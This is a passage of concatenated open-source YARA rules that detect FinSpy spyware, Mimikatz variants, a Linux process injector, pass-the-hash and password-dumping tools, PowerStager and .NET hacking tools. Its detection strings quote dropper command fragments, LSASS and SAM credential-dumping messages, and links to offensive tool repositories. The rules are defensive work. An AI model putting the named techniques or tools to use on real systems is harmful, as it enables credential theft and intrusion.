		$a1 = "set /p \"=4d5a" ascii
		$a2 = "powershell -Command \"$hex=" ascii
		$b1 = "set+%2Fp+%22%3D4d5" ascii
		$b2 = "powershell+-Command+%22%24hex" ascii
		$c1 = "echo 4d 5a " ascii
		$c2 = "echo r cx >>" ascii
		$d1 = "echo+4d+5a+" ascii
		$d2 = "echo+r+cx+%3E%3E" ascii
	condition:
		all of ($a*) or all of ($b*) or all of ($c*) or all of ($d*)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule FinSpy_2
{
    meta:
        description = "FinFisher FinSpy"
	author = "botherder https://github.com/botherder"

    strings:
        $password1 = /\/scomma kbd101\.sys/ wide ascii
        $password2 = /(N)AME,EMAIL CLIENT,EMAIL ADDRESS,SERVER NAME,SERVER TYPE,USERNAME,PASSWORD,PROFILE/ wide ascii
        $password3 = /\/scomma excel2010\.part/ wide ascii
        $password4 = /(A)PPLICATION,PROTOCOL,USERNAME,PASSWORD/ wide ascii
        $password5 = /\/stab MSVCR32\.manifest/ wide ascii
        $password6 = /\/scomma MSN2010\.dll/ wide ascii
        $password7 = /\/scomma Firefox\.base/ wide ascii
        $password8 = /(I)NDEX,URL,USERNAME,PASSWORD,USERNAME FIELD,PASSWORD FIELD,FILE,HTTP/ wide ascii
        $password9 = /\/scomma IE7setup\.sys/ wide ascii
        $password10 = /(O)RIGIN URL,ACTION URL,USERNAME FIELD,PASSWORD FIELD,USERNAME,PASSWORD,TIMESTAMP/ wide ascii
        $password11 = /\/scomma office2007\.cab/ wide ascii
        $password12 = /(U)RL,PASSWORD TYPE,USERNAME,PASSWORD,USERNAME FIELD,PASSWORD FIELD/ wide ascii
        $password13 = /\/scomma outlook2007\.dll/ wide ascii
        $password14 = /(F)ILENAME,ENCRYPTION,VERSION,CRC,PASSWORD 1,PASSWORD 2,PASSWORD 3,PATH,SIZE,LAST MODIFICATION DATE,ERROR/ wide ascii

        $screenrec1 = /(s)111o00000000\.dat/ wide ascii
        $screenrec2 = /(t)111o00000000\.dat/ wide ascii
        $screenrec3 = /(f)113o00000000\.dat/ wide ascii
        $screenrec4 = /(w)114o00000000\.dat/ wide ascii
        $screenrec5 = /(u)112Q00000000\.dat/ wide ascii
        $screenrec6 = /(v)112Q00000000\.dat/ wide ascii
        $screenrec7 = /(v)112O00000000\.dat/ wide ascii

        //$keylogger1 = /\<%s UTC %s\|%d\|%s\>/ wide ascii
        //$keylogger2 = /1201[0-9A-F]{8}\.dat/ wide ascii

        $micrec = /2101[0-9A-F]{8}\.dat/ wide ascii

        $skyperec1 = /\[%19s\] %25s\:    %s/ wide ascii
        $skyperec2 = /Global\\\{A48F1A32\-A340\-11D0\-BC6B\-00A0C903%\.04X\}/ wide
        $skyperec3 = /(1411|1421|1431|1451)[0-9A-F]{8}\.dat/ wide ascii

        $mouserec1 = /(m)sc183Q000\.dat/ wide ascii
        $mouserec2 = /2201[0-9A-F]{8}\.dat/ wide ascii

        $driver = /\\\\\\\\\.\\\\driverw/ wide ascii

        $janedow1 = /(J)ane Dow\'s x32 machine/ wide ascii
        $janedow2 = /(J)ane Dow\'s x64 machine/ wide ascii

        $versions1 = /(f)inspyv2/ nocase
        $versions2 = /(f)inspyv4/ nocase

        $bootkit1 = /(b)ootkit_x32driver/
        $bootkit2 = /(b)ootkit_x64driver/

        $typo1 = /(S)creenShort Recording/ wide

        $mssounddx = /(S)ystem\\CurrentControlSet\\Services\\mssounddx/ wide

    condition:
        8 of ($password*) or any of ($screenrec*) or $micrec or any of ($skyperec*) or any of ($mouserec*) or $driver or any of ($janedow*) or any of ($versions*) or any of ($bootkit*) or $typo1 or $mssounddx
}

rule FinSpy
{
    meta:
        description = "FinFisher FinSpy"
        author = "AlienVault Labs"

    strings:
        $filter1 = "$password14"
        $filter2 = "$screenrec7"
        $filter3 = "$micrec"
        $filter4 = "$skyperec3"
        $filter5 = "$mouserec2"
        $filter6 = "$driver"
        $filter7 = "$janedow2"
        $filter8 = "$bootkit2"

        $password1 = /\/scomma kbd101\.sys/ wide ascii
        $password2 = /(N)AME,EMAIL CLIENT,EMAIL ADDRESS,SERVER NAME,SERVER TYPE,USERNAME,PASSWORD,PROFILE/ wide ascii
        $password3 = /\/scomma excel2010\.part/ wide ascii
        $password4 = /(A)PPLICATION,PROTOCOL,USERNAME,PASSWORD/ wide ascii
        $password5 = /\/stab MSVCR32\.manifest/ wide ascii
        $password6 = /\/scomma MSN2010\.dll/ wide ascii
        $password7 = /\/scomma Firefox\.base/ wide ascii
        $password8 = /(I)NDEX,URL,USERNAME,PASSWORD,USERNAME FIELD,PASSWORD FIELD,FILE,HTTP/ wide ascii
        $password9 = /\/scomma IE7setup\.sys/ wide ascii
        $password10 = /(O)RIGIN URL,ACTION URL,USERNAME FIELD,PASSWORD FIELD,USERNAME,PASSWORD,TIMESTAMP/ wide ascii
        $password11 = /\/scomma office2007\.cab/ wide ascii
        $password12 = /(U)RL,PASSWORD TYPE,USERNAME,PASSWORD,USERNAME FIELD,PASSWORD FIELD/ wide ascii
        $password13 = /\/scomma outlook2007\.dll/ wide ascii
        $password14 = /(F)ILENAME,ENCRYPTION,VERSION,CRC,PASSWORD 1,PASSWORD 2,PASSWORD 3,PATH,SIZE,LAST MODIFICATION DATE,ERROR/ wide ascii

        $screenrec1 = /(s)111o00000000\.dat/ wide ascii
        $screenrec2 = /(t)111o00000000\.dat/ wide ascii
        $screenrec3 = /(f)113o00000000\.dat/ wide ascii
        $screenrec4 = /(w)114o00000000\.dat/ wide ascii
        $screenrec5 = /(u)112Q00000000\.dat/ wide ascii
        $screenrec6 = /(v)112Q00000000\.dat/ wide ascii
        $screenrec7 = /(v)112O00000000\.dat/ wide ascii

        //$keylogger1 = /\<%s UTC %s\|%d\|%s\>/ wide ascii
        //$keylogger2 = /1201[0-9A-F]{8}\.dat/ wide ascii

        $micrec = /2101[0-9A-F]{8}\.dat/ wide ascii

        $skyperec1 = /\[%19s\] %25s\:    %s/ wide ascii
        $skyperec2 = /Global\\\{A48F1A32\-A340\-11D0\-BC6B\-00A0C903%\.04X\}/ wide
        //$skyperec3 = /(1411|1421|1431|1451)[0-9A-F]{8}\.dat/ wide ascii

        //$mouserec1 = /(m)sc183Q000\.dat/ wide ascii
        //$mouserec2 = /2201[0-9A-F]{8}\.dat/ wide ascii

        $driver = /\\\\\\\\\.\\\\driverw/ wide ascii

        $janedow1 = /(J)ane Dow\'s x32 machine/ wide ascii
        $janedow2 = /(J)ane Dow\'s x64 machine/ wide ascii

        //$versions1 = /(f)inspyv2/ nocase
        //$versions2 = /(f)inspyv4/ nocase

        $bootkit1 = /(b)ootkit_x32driver/
        $bootkit2 = /(b)ootkit_x64driver/

        $typo1 = /(S)creenShort Recording/ wide

        $mssounddx = /(S)ystem\\CurrentControlSet\\Services\\mssounddx/ wide

    condition:
        (8 of ($password*) or any of ($screenrec*) or $micrec or any of ($skyperec*) or $driver or any of ($janedow*) or any of ($bootkit*) or $typo1 or $mssounddx) and not any of ($filter*)
}

/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.
*/

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-02-05
	Identifier: Powerkatz
*/

rule Powerkatz_DLL_Generic {
	meta:
		description = "Detects Powerkatz - a Mimikatz version prepared to run in memory via Powershell (overlap with other Mimikatz versions is possible)"
		author = "Florian Roth"
		reference = "PowerKatz Analysis"
		date = "2016-02-05"
		super_rule = 1
		score = 80
		hash1 = "c20f30326fcebad25446cf2e267c341ac34664efad5c50ff07f0738ae2390eae"
		hash2 = "1e67476281c1ec1cf40e17d7fc28a3ab3250b474ef41cb10a72130990f0be6a0"
		hash3 = "49e7bac7e0db87bf3f0185e9cf51f2539dbc11384fefced465230c4e5bce0872"
	strings:
		$s1 = "%3u - Directory '%s' (*.kirbi)" fullword wide
		$s2 = "%*s  pPublicKey         : " fullword wide
		$s3 = "ad_hoc_network_formed" fullword wide
		$s4 = "<3 eo.oe ~ ANSSI E>" fullword wide
		$s5 = "\\*.kirbi" fullword wide

		$c1 = "kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x%08x)" fullword wide
		$c2 = "kuhl_m_lsadump_getComputerAndSyskey ; kuhl_m_lsadump_getSyskey KO" fullword wide
	condition:
		( uint16(0) == 0x5a4d and filesize < 1000KB and 1 of them ) or 2 of them
}
/* 		Yara rule to detect ELF Linux process injector toolkit "mandibule" generic.
   		name: TOOLKIT_Mandibule.yar analyzed by unixfreaxjp. 
		result:
		TOOLKIT_Mandibule ./mandibule//mandibule-dynx86-stripped
		TOOLKIT_Mandibule ./mandibule//mandibule-dynx86-UNstripped
		TOOLKIT_Mandibule ./mandibule//mandibule-dun64-UNstripped
		TOOLKIT_Mandibule ./mandibule//mandibule-dyn64-stripped

   		This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) 
   		and  open to any user or organization, as long as you use it under this license.
*/

private rule is__str_mandibule_gen1 {
	meta:
		author = "unixfreaxjp"
		date = "2018-05-31"
	strings:
		$str01 = "shared arguments too big" fullword nocase wide ascii
		$str02 = "self inject pid: %" fullword nocase wide ascii
		$str03 = "injected shellcode at 0x%lx" fullword nocase wide ascii        	
		$str04 = "target pid: %d" fullword nocase wide ascii        	
		$str05 = "mapping '%s' into memory at 0x%lx" fullword nocase wide ascii
		$str06 = "shellcode injection addr: 0x%lx" fullword nocase wide ascii
		$str07 = "loading elf at: 0x%llx" fullword nocase wide ascii
	condition:
                4 of them
}

private rule is__hex_top_mandibule64 {
	meta:
		author = "unixfreaxjp"
		date = "2018-05-31"
	strings:
		$hex01 = { 48 8D 05 43 01 00 00 48 89 E7 FF D0 } // st
		$hex02 = { 53 48 83 EC 50 48 89 7C 24 08 48 8B 44 24 08 } // mn
		$hex03 = { 48 81 EC 18 02 00 00 89 7C 24 1C 48 89 74 } // pt
		$hex04 = { 53 48 81 EC 70 01 01 00 48 89 7C 24 08 48 8D 44 24 20 48 05 00 00 } // ld
	condition:
                3 of them 
}

private rule is__hex_mid_mandibule32 {
	meta:
		author = "unixfreaxjp"
		date = "2018-06-01"
	strings:
		$hex05 = { E8 09 07 00 00 81 C1 FC 1F 00 00 8D 81 26 E1 FF FF } // st
		$hex06 = { 56 53 83 EC 24 E8 E1 05 00 00 81 C3 D0 1E 00 00 8B 44 24 30} // mn
		$hex07 = { 81 C3 E8 29 00 00 C7 44 24 0C } // pt
		$hex08 = { E8 C6 D5 FF FF 83 C4 0C 68 00 01 00 00 } // ld
	condition:
                3 of them 
}

rule TOOLKIT_Mandibule {
	meta:
		description = "Generic detection for ELF Linux process injector mandibule generic"
		reference = "https://imgur.com/a/MuHSZtC"
		author = "unixfreaxjp"
		org = "MalwareMustDie"
		date = "2018-06-01"
	condition:
		((is__str_mandibule_gen1) or (is__hex_mid_mandibule32))
		or ((is__str_mandibule_gen1) or (is__hex_top_mandibule64))
		and uint32(0) == 0x464c457f
		and filesize < 30KB 
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
rule whosthere_alt : Toolkit {
	meta:
		description = "Auto-generated rule - file whosthere-alt.exe"
		author = "Florian Roth"
		reference = "http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit"
		date = "2015-07-10"
		score = 80
		hash = "9b4c3691872ca5adf6d312b04190c6e14dd9cbe10e94c0dd3ee874f82db897de"
	strings:
		$s0 = "WHOSTHERE-ALT v1.1 - by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com) - (c) 2007-2008 Core Security Technologies" fullword ascii /* PEStudio Blacklist: strings */ /* score: '49.00' */
		$s1 = "whosthere enters an infinite loop and searches for new logon sessions every 2 seconds. Only new sessions are shown if found." fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00' */
		$s2 = "dump output to a file, -o filename" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00' */
		$s3 = "This tool lists the active LSA logon sessions with NTLM credentials." fullword ascii /* PEStudio Blacklist: strings */ /* score: '29.00' */
		$s4 = "Error: pth.dll is not in the current directory!." fullword ascii /* score: '24.00' */
		$s5 = "the output format is: username:domain:lmhash:nthash" fullword ascii /* PEStudio Blacklist: strings */ /* score: '17.00' */
		$s6 = ".\\pth.dll" fullword ascii /* score: '16.00' */
		$s7 = "Cannot get LSASS.EXE PID!" fullword ascii /* score: '14.00' */
	condition:
		uint16(0) == 0x5a4d and filesize < 280KB and 2 of them
}

rule iam_alt_iam_alt : Toolkit  {
	meta:
		description = "Auto-generated rule - file iam-alt.exe"
		author = "Florian Roth"
		reference = "http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit"
		date = "2015-07-10"
		score = 80
		hash = "2ea662ef58142d9e340553ce50d95c1b7a405672acdfd476403a565bdd0cfb90"
	strings:
		$s0 = "<cmd>. Create a new logon session and run a command with the specified credentials (e.g.: -r cmd.exe)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '59.00' */
		$s1 = "IAM-ALT v1.1 - by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com) - (c) 2007-2008 Core Security Technologies" fullword ascii /* PEStudio Blacklist: strings */ /* score: '43.00' */
		$s2 = "This tool allows you to change the NTLM credentials of the current logon session" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.00' */
		$s3 = "username:domainname:lmhash:nthash" fullword ascii /* PEStudio Blacklist: strings */ /* score: '15.00' */
		$s4 = "Error in cmdline!. Bye!." fullword ascii /* score: '12.00' */
		$s5 = "Error: Cannot open LSASS.EXE!." fullword ascii /* score: '12.00' */
		$s6 = "nthash is too long!." fullword ascii /* score: '8.00' */
		$s7 = "LSASS HANDLE: %x" fullword ascii /* score: '5.00' */
	condition:
		uint16(0) == 0x5a4d and filesize < 240KB and 2 of them
}

rule genhash_genhash : Toolkit  {
	meta:
		description = "Auto-generated rule - file genhash.exe"
		author = "Florian Roth"
		reference = "http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit"
		date = "2015-07-10"
		score = 80
		hash = "113df11063f8634f0d2a28e0b0e3c2b1f952ef95bad217fd46abff189be5373f"
	strings:
		$s1 = "genhash.exe <password>" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00' */
		$s3 = "Password: %s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '17.00' */
		$s4 = "%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X" fullword ascii /* score: '11.00' */
		$s5 = "This tool generates LM and NT hashes." fullword ascii /* score: '10.00' */
		$s6 = "(hashes format: LM Hash:NT hash)" fullword ascii /* score: '10.00' */
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and 2 of them
}

rule iam_iamdll : Toolkit  {
	meta:
		description = "Auto-generated rule - file iamdll.dll"
		author = "Florian Roth"
		reference = "http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit"
		date = "2015-07-10"
		score = 80
		hash = "892de92f71941f7b9e550de00a57767beb7abe1171562e29428b84988cee6602"
	strings:
		$s0 = "LSASRV.DLL" fullword ascii /* score: '21.00' */
		$s1 = "iamdll.dll" fullword ascii /* score: '21.00' */
		$s2 = "ChangeCreds" fullword ascii /* score: '12.00' */
	condition:
		uint16(0) == 0x5a4d and filesize < 115KB and all of them
}

rule iam_iam : Toolkit  {
	meta:
		description = "Auto-generated rule - file iam.exe"
		author = "Florian Roth"
		reference = "http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit"
		date = "2015-07-10"
		score = 80
		hash = "8a8fcce649259f1b670bb1d996f0d06f6649baa8eed60db79b2c16ad22d14231"
	strings:
		$s1 = "<cmd>. Create a new logon session and run a command with the specified credentials (e.g.: -r cmd.exe)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '59.00' */
		$s2 = "iam.exe -h administrator:mydomain:"  ascii /* PEStudio Blacklist: strings */ /* score: '40.00' */
		$s3 = "An error was encountered when trying to change the current logon credentials!." fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.00' */
		$s4 = "optional parameter. If iam.exe crashes or doesn't work when run in your system, use this parameter." fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00' */
		$s5 = "IAM.EXE will try to locate some memory locations instead of using hard-coded values." fullword ascii /* score: '26.00' */
		$s6 = "Error in cmdline!. Bye!." fullword ascii /* score: '12.00' */
		$s7 = "Checking LSASRV.DLL...." fullword ascii /* score: '12.00' */
	condition:
		uint16(0) == 0x5a4d and filesize < 300KB and all of them
}

rule whosthere_alt_pth : Toolkit  {
	meta:
		description = "Auto-generated rule - file pth.dll"
		author = "Florian Roth"
		reference = "http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit"
		date = "2015-07-10"
		score = 80
		hash = "fbfc8e1bc69348721f06e96ff76ae92f3551f33ed3868808efdb670430ae8bd0"
	strings:
		$s0 = "c:\\debug.txt" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00' */
		$s1 = "pth.dll" fullword ascii /* score: '20.00' */
		$s2 = "\"Primary\" string found at %.8Xh" fullword ascii /* score: '7.00' */
		$s3 = "\"Primary\" string not found!" fullword ascii /* score: '6.00' */
		$s4 = "segment 1 found at %.8Xh" fullword ascii /* score: '6.00' */
	condition:
		uint16(0) == 0x5a4d and filesize < 240KB and 4 of them
}

rule whosthere : Toolkit  {
	meta:
		description = "Auto-generated rule - file whosthere.exe"
		author = "Florian Roth"
		reference = "http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit"
		date = "2015-07-10"
		score = 80
		hash = "d7a82204d3e511cf5af58eabdd6e9757c5dd243f9aca3999dc0e5d1603b1fa37"
	strings:
		$s1 = "by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com) - (c) 2007-2008 Core Security Technologies" fullword ascii /* PEStudio Blacklist: strings */ /* score: '48.00' */
		$s2 = "whosthere enters an infinite loop and searches for new logon sessions every 2 seconds. Only new sessions are shown if found." fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00' */
		$s3 = "specify addresses to use. Format: ADDCREDENTIAL_ADDR:ENCRYPTMEMORY_ADDR:FEEDBACK_ADDR:DESKEY_ADDR:LOGONSESSIONLIST_ADDR:LOGONSES" ascii /* PEStudio Blacklist: strings */ /* score: '28.00' */
		$s4 = "Could not enable debug privileges. You must run this tool with an account with administrator privileges." fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00' */
		$s5 = "-B is now used by default. Trying to find correct addresses.." fullword ascii /* PEStudio Blacklist: strings */ /* score: '15.00' */
		$s6 = "Cannot get LSASS.EXE PID!" fullword ascii /* score: '14.00' */
	condition:
		uint16(0) == 0x5a4d and filesize < 320KB and 2 of them
}
rule Powerstager
{
    meta:
      author = "Jeff White - jwhite@paloaltonetworks.com @noottrak"
      date = "02JAN2018"
      hash1 = "758097319d61e2744fb6b297f0bff957c6aab299278c1f56a90fba197795a0fa" //x86
      hash2 = "83e714e72d9f3c500cad610c4772eae6152a232965191f0125c1c6f97004b7b5" //x64
      description = "Detects PowerStager Windows executable, both x86 and x64"
      reference = "https://researchcenter.paloaltonetworks.com/2018/01/unit42-powerstager-analysis/"
      reference2 = "https://github.com/z0noxz/powerstager"
    
    strings:
      $filename = /%s\\[a-zA-Z0-9]{12}/
      $pathname = "TEMP" wide ascii
//    $errormsg = "The version of this file is not compatible with the version of Windows you're running." wide ascii
      $filedesc = "Lorem ipsum dolor sit amet, consecteteur adipiscing elit" wide ascii
      $apicall_01 = "memset"
      $apicall_02 = "getenv"
      $apicall_03 = "fopen"
      $apicall_04 = "memcpy"
      $apicall_05 = "fwrite"
      $apicall_06 = "fclose"
      $apicall_07 = "CreateProcessA"
      $decoder_x86_01 = { 8D 95 [4] 8B 45 ?? 01 D0 0F B6 18 8B 4D ?? }
      $decoder_x86_02 = { 89 C8 0F B6 84 05 [4] 31 C3 89 D9 8D 95 [4] 8B 45 ?? 01 D0 88 08 83 45 [2] 8B 45 ?? 3D }
      $decoder_x64_01 = { 8B 85 [4] 48 98 44 0F [7] 8B 85 [4] 48 63 C8 48 }
      $decoder_x64_02 = { 48 89 ?? 0F B6 [3-6] 44 89 C2 31 C2 8B 85 [4] 48 98 }

    condition:
      uint16be(0) == 0x4D5A
        and
      all of ($apicall_*)
        and
      $filename
        and
      $pathname
        and
      $filedesc
        and
      (2 of ($decoder_x86*) or 2 of ($decoder_x64*))
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
rule QuarksPwDump_Gen : Toolkit  {
	meta:
		description = "Detects all QuarksPWDump versions"
		author = "Florian Roth"
		date = "2015-09-29"
		score = 80
		hash1 = "2b86e6aea37c324ce686bd2b49cf5b871d90f51cec24476daa01dd69543b54fa"
		hash2 = "87e4c76cd194568e65287f894b4afcef26d498386de181f568879dde124ff48f"
		hash3 = "a59be92bf4cce04335bd1a1fcf08c1a94d5820b80c068b3efe13e2ca83d857c9"
		hash4 = "c5cbb06caa5067fdf916e2f56572435dd40439d8e8554d3354b44f0fd45814ab"
		hash5 = "677c06db064ee8d8777a56a641f773266a4d8e0e48fbf0331da696bea16df6aa"
		hash6 = "d3a1eb1f47588e953b9759a76dfa3f07a3b95fab8d8aa59000fd98251d499674"
		hash7 = "8a81b3a75e783765fe4335a2a6d1e126b12e09380edc4da8319efd9288d88819"
	strings:
		$s1 = "OpenProcessToken() error: 0x%08X" fullword ascii
		$s2 = "%d dumped" fullword ascii
		$s3 = "AdjustTokenPrivileges() error: 0x%08X" fullword ascii
		$s4 = "\\SAM-%u.dmp" fullword ascii
	condition:
		all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or
    organization, as long as you use it under this license.
*/


// These rules have room for false positives if e.g. a dual use tool is contained within a hack tool repo.
// Could also be done with https://yara.readthedocs.io/en/stable/modules/dotnet.html#c.typelib but that needs an extra module.


rule HKTL_NET_GUID_CSharpSetThreadContext {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/djhohnstein/CSharpSetThreadContext"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "a1e28c8c-b3bd-44de-85b9-8aa7c18a714d" ascii nocase wide
        $typelibguid1 = "87c5970e-0c77-4182-afe2-3fe96f785ebb" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_DLL_Injection {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/ihack4falafel/DLL-Injection"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "3d7e1433-f81a-428a-934f-7cc7fcf1149d" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_LimeUSB_Csharp {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/NYAN-x-CAT/LimeUSB-Csharp"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "94ea43ab-7878-4048-a64e-2b21b3b4366d" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Ladon {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/k8gege/Ladon"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "c335405f-5df2-4c7d-9b53-d65adfbed412" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_WhiteListEvasion {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/khr0x40sh/WhiteListEvasion"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "858386df-4656-4a1e-94b7-47f6aa555658" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Lime_Downloader {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/NYAN-x-CAT/Lime-Downloader"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "ec7afd4c-fbc4-47c1-99aa-6ebb05094173" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_DarkEye {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/K1ngSoul/DarkEye"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "0bdb9c65-14ed-4205-ab0c-ea2151866a7f" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpKatz {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/b4rtik/SharpKatz"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "8568b4c1-2940-4f6c-bf4e-4383ef268be9" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_ExternalC2 {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/ryhanson/ExternalC2"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "7266acbb-b10d-4873-9b99-12d2043b1d4e" ascii nocase wide
        $typelibguid1 = "5d9515d0-df67-40ed-a6b2-6619620ef0ef" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Povlsomware {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/povlteksttv/Povlsomware"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "fe0d5aa7-538f-42f6-9ece-b141560f7781" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_RunShellcode {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/zerosum0x0/RunShellcode"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "a3ec18a3-674c-4131-a7f5-acbed034b819" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpLoginPrompt {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/shantanu561993/SharpLoginPrompt"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "c12e69cd-78a0-4960-af7e-88cbd794af97" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Adamantium_Thief {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/LimerBoy/Adamantium-Thief"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "e6104bc9-fea9-4ee9-b919-28156c1f2ede" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_PSByPassCLM {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/padovah4ck/PSByPassCLM"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "46034038-0113-4d75-81fd-eb3b483f2662" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_physmem2profit {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/FSecureLABS/physmem2profit"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "814708c9-2320-42d2-a45f-31e42da06a94" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_NoAmci {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/med0x2e/NoAmci"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "352e80ec-72a5-4aa6-aabe-4f9a20393e8e" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpBlock {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/CCob/SharpBlock"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "3cf25e04-27e4-4d19-945e-dadc37c81152" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_nopowershell {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/bitsadmin/nopowershell"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
